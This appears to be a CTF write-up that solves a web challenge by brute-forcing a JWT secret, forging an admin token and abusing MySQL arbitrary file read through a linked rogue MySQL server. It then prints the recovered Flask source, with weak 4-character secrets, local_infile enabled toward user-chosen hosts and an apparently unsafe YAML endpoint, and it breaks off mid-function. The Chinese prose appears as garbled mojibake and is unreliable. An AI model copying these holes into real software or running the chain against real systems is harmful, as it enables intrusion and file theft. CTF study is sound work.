<p>è·³è½¬åˆ°mysqlæµ‹è¯•é“¾æ¥ï¼Œä½†æ˜¯éœ€è¦adminæƒé™æ‰èƒ½è·å–è¿æ¥</p>
<p><img src="/p/qctf2025/image-20251114150903634.png"
	width="1074"
	height="846"
	srcset="/p/qctf2025/image-20251114150903634_hu8532041120575200847.png 480w, /p/qctf2025/image-20251114150903634_hu6382940122669929256.png 1024w"
	loading="lazy"
	
		alt="image-20251114150903634"
	
	
		class="gallery-image" 
		data-flex-grow="126"
		data-flex-basis="304px"
	
></p>
<p>æŠ“åŒ…çœ‹åˆ°JWTï¼Œæ²¡æœ‰å…¶ä»–ä¿¡æ¯ç‚¹æ—¶ä¼˜å…ˆè€ƒè™‘çˆ†ç ´ã€‚</p>
<p><img src="/p/qctf2025/image-20251114151058014.png"
	width="746"
	height="671"
	srcset="/p/qctf2025/image-20251114151058014_hu3391649048006176176.png 480w, /p/qctf2025/image-20251114151058014_hu17197652720420872112.png 1024w"
	loading="lazy"
	
		alt="image-20251114151058014"
	
	
		class="gallery-image" 
		data-flex-grow="111"
		data-flex-basis="266px"
	
></p>
<p><img src="/p/qctf2025/image-20251114151452322.png"
	width="418"
	height="147"
	srcset="/p/qctf2025/image-20251114151452322_hu15281234993680650164.png 480w, /p/qctf2025/image-20251114151452322_hu18105395149464502540.png 1024w"
	loading="lazy"
	
		alt="image-20251114151452322"
	
	
		class="gallery-image" 
		data-flex-grow="284"
		data-flex-basis="682px"
	
></p>
<p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯ä¼ªé€ äº†</p>
<p><img src="/p/qctf2025/image-20251114151715129.png"
	width="1989"
	height="926"
	srcset="/p/qctf2025/image-20251114151715129_hu6333207023227860529.png 480w, /p/qctf2025/image-20251114151715129_hu13785559153773019529.png 1024w"
	loading="lazy"
	
		alt="image-20251114151715129"
	
	
		class="gallery-image" 
		data-flex-grow="214"
		data-flex-basis="515px"
	
></p>
<p>ä¹‹åå†æ¬¡è¿æ¥æ˜¾ç¤ºè¿æ¥å¤±è´¥</p>
<p>æŸ¥çœ‹wpå¾—çŸ¥è¿™é‡Œè€ƒçš„æ˜¯mysqlä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</p>
<p><a class="link" href="https://byaaronluo.github.io/%e7%9f%a5%e8%af%86%e5%ba%93/01.WEB%e5%ae%89%e5%85%a8/99.%e5%85%b6%e4%bb%96/18.MYSQL%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e8%af%bb%e5%8f%96.html"  target="_blank" rel="noopener"
    >18.MYSQLä»»æ„æ–‡ä»¶è¯»å– Â· Aaron çŸ¥è¯†åº“</a></p>
<p>è„šæœ¬ï¼š<a class="link" href="https://github.com/allyshka/Rogue-MySql-Server/blob/master/rogue_mysql_server.py"  target="_blank" rel="noopener"
    >Rogue-MySql-Server/rogue_mysql_server.py at master Â· allyshka/Rogue-MySql-Server</a></p>
<p>é¦–å…ˆåœ¨è‡ªå·±çš„è™šæ‹Ÿæœºä¸Šè¿è¡Œä¸Šè¿°è„šæœ¬ï¼Œç„¶åé€šè¿‡Cpolarç©¿é€åˆ°å¤–ç½‘ï¼Œç„¶åæŸ¥åŸŸåå¯ä»¥è·å–ipï¼Œæœ€åè°ƒæ•´å‚æ•°å‘åŒ…ï¼Œè™šæ‹Ÿæœºè¿™é‡Œè‡ªå·±ä¼šç”Ÿæˆmysql.logï¼Œé‚£ä¸ªå°±æ˜¯è¿”å›å€¼äº†</p>
<p><img src="/p/qctf2025/image-20251114205620731.png"
	width="1080"
	height="747"
	srcset="/p/qctf2025/image-20251114205620731_hu17903376832214377152.png 480w, /p/qctf2025/image-20251114205620731_hu725524565218939008.png 1024w"
	loading="lazy"
	
		alt="image-20251114205620731"
	
	
		class="gallery-image" 
		data-flex-grow="144"
		data-flex-basis="346px"
	
></p>
<p>ç„¶åå°±æ˜¯ä¿®æ”¹filelist</p>
<p><img src="/p/qctf2025/image-20251114205409564.png"
	width="626"
	height="119"
	srcset="/p/qctf2025/image-20251114205409564_hu15472009576367506649.png 480w, /p/qctf2025/image-20251114205409564_hu12581369730708883952.png 1024w"
	loading="lazy"
	
		alt="image-20251114205409564"
	
	
		class="gallery-image" 
		data-flex-grow="526"
		data-flex-basis="1262px"
	
></p>
<p>è¿™é‡Œæ”¹é”™äº†ï¼Œç›´æ¥app.pyå°±è¡Œï¼ŒæˆåŠŸè·å–æºç </p>
<p><img src="/p/qctf2025/image-20251114210154809.png"
	width="967"
	height="500"
	srcset="/p/qctf2025/image-20251114210154809_hu6444151662506265930.png 480w, /p/qctf2025/image-20251114210154809_hu15202134890143314589.png 1024w"
	loading="lazy"
	
		alt="image-20251114210154809"
	
	
		class="gallery-image" 
		data-flex-grow="193"
		data-flex-basis="464px"
	
></p>
<p>è®©aiæ•´åˆä¸€ä¸‹ä»£ç ï¼Œå»é™¤ä¸€ä¸‹æ²¡å¿…è¦çš„htmlä»£ç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">flask</span> <span class="n">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">render_template_string</span>
</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">MySQLdb</span>
</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">jwt</span>
</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">random</span>
</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">string</span>
</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">functools</span> <span class="n">import</span> <span class="n">wraps</span>
</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">datetime</span> <span class="n">import</span> <span class="n">datetime</span><span class="p">,</span> <span class="n">timedelta</span>
</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">yaml</span>  <span class="c1"># pyyaml==5.1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ==================== é…ç½®å’Œå¸¸é‡ ====================</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">JWT_SECRET</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">JWT_ALGORITHM</span> <span class="o">=</span> <span class="s1">&#39;HS256&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ç”¨æˆ·å‡­è¯</span>
</span></span><span class="line"><span class="cl"><span class="n">admin_pass</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">10</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">USERS</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;admin&#39;</span><span class="p">:</span> <span class="n">admin_pass</span><span class="p">,</span> <span class="s1">&#39;user&#39;</span><span class="p">:</span> <span class="s1">&#39;pass&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ==================== JWT å·¥å…·å‡½æ•° ====================</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">generate_token</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;ç”ŸæˆJWTä»¤ç‰Œ&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;exp&#39;</span><span class="p">:</span> <span class="n">datetime</span><span class="o">.</span><span class="n">utcnow</span><span class="p">()</span> <span class="o">+</span> <span class="n">timedelta</span><span class="p">(</span><span class="n">hours</span><span class="o">=</span><span class="mi">24</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">JWT_SECRET</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="n">JWT_ALGORITHM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;éªŒè¯JWTä»¤ç‰Œ&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">JWT_SECRET</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="n">JWT_ALGORITHM</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">payload</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">except</span> <span class="n">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ==================== è£…é¥°å™¨ ====================</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login_required</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;ç™»å½•éªŒè¯è£…é¥°å™¨&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="err">@</span><span class="n">wraps</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">wrapper</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;Authorization&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">token</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">token</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;Bearer &#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;Token missing&#39;</span><span class="p">}),</span> <span class="mi">401</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">        <span class="n">username</span> <span class="o">=</span> <span class="n">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">[</span><span class="mi">7</span><span class="p">:])</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">username</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;Invalid token&#39;</span><span class="p">}),</span> <span class="mi">401</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">        <span class="n">request</span><span class="o">.</span><span class="n">current_user</span> <span class="o">=</span> <span class="n">username</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">f</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">wrapper</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ==================== è·¯ç”±å®šä¹‰ ====================</span>
</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;é¦–é¡µ - ç™»å½•é¡µé¢&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">LOGIN_PAGE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;ç”¨æˆ·ç™»å½•æ¥å£&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_json</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">username</span> <span class="ow">in</span> <span class="n">USERS</span> <span class="ow">and</span> <span class="n">USERS</span><span class="p">[</span><span class="n">username</span><span class="p">]</span> <span class="o">==</span> <span class="n">password</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">token</span> <span class="o">=</span> <span class="n">generate_token</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;success&#39;</span><span class="p">:</span> <span class="n">True</span><span class="p">,</span> <span class="s1">&#39;token&#39;</span><span class="p">:</span> <span class="n">token</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;success&#39;</span><span class="p">:</span> <span class="n">False</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/test&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mysql_test_page</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;MySQL è¿æ¥æµ‹è¯•é¡µé¢&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">TEST_PAGE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/test_mysql&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">login_required</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">test_mysql</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;MySQL è¿æ¥æµ‹è¯•æ¥å£ï¼ˆä»…é™ admin ç”¨æˆ·ï¼‰&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">current_user</span> <span class="o">!=</span> <span class="s1">&#39;admin&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;success&#34;</span><span class="p">:</span> <span class="n">False</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;error&#34;</span><span class="p">:</span> <span class="s2">&#34;æƒé™ä¸è¶³ï¼Œåªæœ‰ admin å¯ä»¥æµ‹è¯• MySQL è¿æ¥&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}),</span> <span class="mi">403</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_json</span><span class="p">()</span> <span class="ow">or</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># æ£€æŸ¥å¿…è¦å­—æ®µ</span>
</span></span><span class="line"><span class="cl">    <span class="n">required_fields</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;host&#34;</span><span class="p">,</span> <span class="s2">&#34;port&#34;</span><span class="p">,</span> <span class="s2">&#34;user&#34;</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="p">,</span> <span class="s2">&#34;db&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">field</span> <span class="ow">in</span> <span class="n">required_fields</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">field</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;success&#34;</span><span class="p">:</span> <span class="n">False</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;error&#34;</span><span class="p">:</span> <span class="n">f</span><span class="s2">&#34;ç¼ºå°‘å­—æ®µ: {field}&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">})</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># æµ‹è¯•æ•°æ®åº“è¿æ¥</span>
</span></span><span class="line"><span class="cl">    <span class="n">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn</span> <span class="o">=</span> <span class="n">MySQLdb</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">host</span><span class="o">=</span><span class="n">data</span><span class="p">[</span><span class="s2">&#34;host&#34;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">            <span class="n">port</span><span class="o">=</span><span class="ne">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="s2">&#34;port&#34;</span><span class="p">]),</span>
</span></span><span class="line"><span class="cl">            <span class="n">user</span><span class="o">=</span><span class="n">data</span><span class="p">[</span><span class="s2">&#34;user&#34;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">            <span class="n">passwd</span><span class="o">=</span><span class="n">data</span><span class="p">[</span><span class="s2">&#34;password&#34;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">            <span class="n">db</span><span class="o">=</span><span class="n">data</span><span class="p">[</span><span class="s2">&#34;db&#34;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">            <span class="n">connect_timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">charset</span><span class="o">=</span><span class="s1">&#39;utf8mb4&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">local_infile</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">ssl</span><span class="o">=</span><span class="n">None</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># æ‰§è¡Œç®€å•æŸ¥è¯¢éªŒè¯è¿æ¥</span>
</span></span><span class="line"><span class="cl">        <span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;SELECT 1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">cursor</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;success&#34;</span><span class="p">:</span> <span class="n">True</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">    <span class="n">except</span> <span class="n">MySQLdb</span><span class="o">.</span><span class="n">Error</span> <span class="n">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;success&#34;</span><span class="p">:</span> <span class="n">False</span><span class="p">,</span> <span class="s2">&#34;error&#34;</span><span class="p">:</span> <span class="n">f</span><span class="s2">&#34;æ•°æ®åº“é”™è¯¯: {str(e)}&#34;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="n">except</span> <span class="n">Exception</span> <span class="n">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;success&#34;</span><span class="p">:</span> <span class="n">False</span><span class="p">,</span> <span class="s2">&#34;error&#34;</span><span class="p">:</span> <span class="n">f</span><span class="s2">&#34;å…¶ä»–é”™è¯¯: {e}&#34;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/uneed1t&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">uneed1t</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;YAML æ•°æ®å¤„ç†æ¥å£ï¼ˆå­˜åœ¨å®‰å…¨é£é™©ï¼‰&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;data&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;result&#34;</span><span class="p">:</span> <span class="s2">&#34;null&#34;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">    
